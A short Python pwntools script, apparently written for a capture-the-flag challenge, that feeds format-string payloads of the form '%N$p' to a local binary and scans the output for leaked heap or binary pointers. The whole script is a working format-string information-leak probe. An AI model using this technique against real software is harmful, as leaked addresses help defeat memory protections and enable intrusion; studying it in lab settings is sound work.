from pwn import *
import re

for i in range(1,20):
    p = process("./chall")

    payload = f"%{i}$p".encode()
    p.sendlineafter(b"kids?", payload)

    out = p.recvall().decode()

    m = re.search(r"0x[0-9a-fA-F]+", out)
    if m:
        addr = int(m.group(0),16)

        # biasanya heap / binary address mulai 0x55
        if hex(addr).startswith("0x55"):
            print(f"possible heap pointer at arg {i}")
            print(hex(addr))
            print(out)

    p.close()